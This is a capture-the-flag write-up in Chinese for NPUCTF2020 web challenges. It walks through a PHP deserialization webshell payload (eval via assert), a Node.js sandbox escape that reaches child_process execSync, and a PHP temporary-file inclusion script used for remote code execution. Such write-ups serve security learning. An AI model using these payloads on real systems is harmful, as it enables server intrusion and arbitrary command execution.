---
title: NPUCTF2020_wp
date: 2020-04-21
draft: false
image: 
description: 西工大举办的比赛，难度非常顶
categories: 
- ctf_writeup
tags:
- NodeJS
- WebCrypto
- 临时文件包含
---
### 查源码

F12，ctrl+U，没啥好说的

 

 

 

 

### [RealEzPHP](https://buuoj.cn/challenges#[NPUCTF2020]ReadlezPHP)

打开是个黑页，查看源码发现了 `./time.php?source` 访问之：

```
 <?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);


2020-04-21 07:53:29
```

很简单的一个反序列化，

```
<?php
#error_reporting(0);
class HelloPhp
{
    public $a = '1';//更改为2，3，4，5能读取更多信息
    public $b = 'phpinfo';
/*
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
*/
}

$pop = new HelloPhp;
echo serialize($pop);
```

 

直接 `?data=O:8:"HelloPhp":2:{s:1:"a";s:1:"1";s:1:"b";s:7:"phpinfo";}` 就能看到phpinfo页面；

好，写后门：

```
<?php
#error_reporting(0);
class HelloPhp
{
    public $a = 'eval($_POST[\'wh1sper\']);';
    public $b = 'assert';
/*
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
*/
}

$pop = new HelloPhp;
echo serialize($pop);
```

O:8:"HelloPhp":2:{s:1:"a";s:24:"eval($_POST['wh1sper']);";s:1:"b";s:6:"assert";}

蚁剑访问 `?data=O:8:"HelloPhp":2:{s:1:"a";s:24:"eval($_POST['wh1sper']);";s:1:"b";s:6:"assert";}` 密码wh1sper就能拿到shell，不过在phpinfo里面可以看到禁用了很多函数，这里可以使用蚁剑的插件绕过：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120170223.png)

直接美滋滋；

不过根目录是假flag，flag就在phpinfo页面。。。。。

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120170231.png)flag{6b8ca41f-d409-4d39-b62f-5243d2f0d64b}

我还去探测内网，真的搞心态。。。

 

 

 

 

### [web🐕](https://buuoj.cn/challenges#[NPUCTF2020]web🐕)

考察密码学，详见本站：[Padding Oracle Attack&CBC字节翻转攻击](http://wh1sper.com/padding-oracle-attackcbc字节翻转攻击/)

 

 

 

### [验证🐎](https://buuoj.cn/challenges#[NPUCTF2020]验证🐎)

参考：https://guokeya.github.io/post/XxOKeal9U/

考点：JS弱类型转换，JS原型链

源码：

```
const express = require('express');
const bodyParser = require('body-parser');
const cookieSession = require('cookie-session');

const fs = require('fs');
const crypto = require('crypto');

const keys = require('./key.js').keys;

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
    return null;
  }
  return eval(str);
} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个

const template = fs.readFileSync('./index.html').toString();
function render(results) {
  return template.replace('{{results}}', results.join('<br/>'));
}

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(cookieSession({
  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给爪⑧
  keys
}));

Object.freeze(Object);
Object.freeze(Math);

app.post('/', function (req, res) {
  let result = '';
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
      } catch (e) {
        console.log(e);
        result = 'Wrong Wrong Wrong!!!';
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift('Not verified!');
  }
  if (results.length > 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});

app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  req.session.admin = req.session.admin || 0;
  res.send(render(req.session.results = req.session.results || []))
});

app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```

第一层45行，`first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])`要求first和second长度相同，值不同，然后经过加盐之后值完全相同，一般这种看到就知道是弱类型，在[susecctf](http://wh1sper.com/susec_ctf_2020_web0_wp/)上面遇见过，盐是字符串，当拼接的时候，first和second都会被转化为字符串，那么我们可以传入

```
first='1' second=[1]
```

但是urlencode没办法传递数组，第31行恰巧提示了可以接受json形式的数据，那么我们就可以传入json：

```
Content-Type: application/json
{"e":"1+1","first":"1","second":[1]}
```

我们可以看到1+1被执行了；

 

第二层，17行， `if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, ''))` 这句话意思大概是，e的值只能 是 `Math.xxxxx` 。符号只能出现 `()+\-*&|%^<>=,?:` 。

由于=>的存在，我们得以使用JS的箭头函数，大概是这个意思：

```
x => x*x
等价于
function (x){
  return x*x;
}
```

我们对照着playload一步步看：

```
(Math=>
(Math=Math.constructor,
Math.x=Math.constructor(
Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,
99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,
46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,
95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,
121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()
)
)(Math+1)
```

最外层的是

```
(Math=>(xxxxx)())(Math+1)
```

最外面的小括号是JS立即执行的函数，否则你就只是单单定义了`function (Math){}`这个函数。

开头的`Math`是函数接受的参数也就是形参，`xxxxx`是函数体，`(Math+1)`是实际传入的参数

接下来我们看他的函数体`xxxxx`干了些什么；

举个例子：

```
Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))
```

可以看到，这里定义了Math，把传入的Math的[constructor属性](https://blog.csdn.net/zengyonglan/article/details/53465505)赋值

具体是什么意思呢？这里是利用了JS的原型链：

- 一开始`Math`并没有定义，如果我们直接传入`Match`，那么会是`object`，而payload中传入的是`Math+1`，此时类型就变成了`object1`。object对象和字符串进行拼接。那么会转换为`string`类型
- 为了清楚，我们重写下代码：

```
test=Math.constructor //传入的Math是string，返回string类型的原型，String[function String()]
test2=test.constructor //返回string原型的原型，Function[funciton Function]
```

- 也就是通过一个 `object1` 从原型链上获取了`String`和`Function`两种类型

 

回到题目，

```
#fromCharCode函数必须是在String类型上用，也就是String.fromCharCode()
Math=Math.constructor
  #定义了string类型
Math=Math.construtor
  #定义了function类型
Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()
等同于
function(string.fromCharCode(xxxxxxxxx)()
```

exp中fromCharCode里面解码是：

```
return process.mainModule.require('child_process').execSync('cat /flag').toString()
```

相当于我们执行了：

```
function(
return process.mainModule.require('child_process').execSync('cat /flag').toString()
)()
```

flag{7683e76d-e61e-4b5a-bca0-3ad38bfa27a0}

 

 

 

### [ezinclude](https://buuoj.cn/challenges#[NPUCTF2020]ezinclude)

考点：MD5哈希长度拓展攻击（疑似）、PHP7利用php Segfault包含保存的临时文件

打开题目，源代码里面有提示：`<!--md5($secret.$name)===$pass -->` 疑似[MD5哈希长度拓展攻击](https://xz.aliyun.com/t/2563)，不过在响应包里面给出啦pass的值，可能是出题出翻车了

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120170244.png)

得到了 `flflflflag.php` ，访问重定向到了其他页面，抓包抓回来，页面提示 `include($_GET["file"])` ，扫目录可以得到 `dir.php` ,包含他可以看到这个页面列出了 `/tmp` 下的所有文件

这里考察的是PHP临时文件包含，其基本是两种情况：

1. 利用能访问的phpinfo页面，对其一次发送大量数据造成临时文件没有及时被删除
2. PHP版本<7.2，利用php崩溃留下临时文件

贴一篇：[>>LFIroRCE总结](https://bbs.zkaq.cn/t/3639.html)

[>>文件包含&奇技淫巧](https://zhuanlan.zhihu.com/p/62958418)

这里就不累述了，直接上脚本：

```
import requests
from io import BytesIO

payload = "<?php phpinfo()?>"
file_data = {
    'file': BytesIO(payload.encode())
}
url = "http://35869f0e-43e6-47db-a026-b77fdfed3fea.node3.buuoj.cn/flflflflag.php?"\
      +"file=php://filter/string.strip_tags/resource=/etc/passwd"
r = requests.post(url=url, files=file_data, allow_redirects=False)
```

然后访问 `dir.php` 可以得到临时文件的名称，包含之即可RCE

flag就在phpinfo页面

flag{2ac28208-c35f-426b-bca5-4f50a77e1203}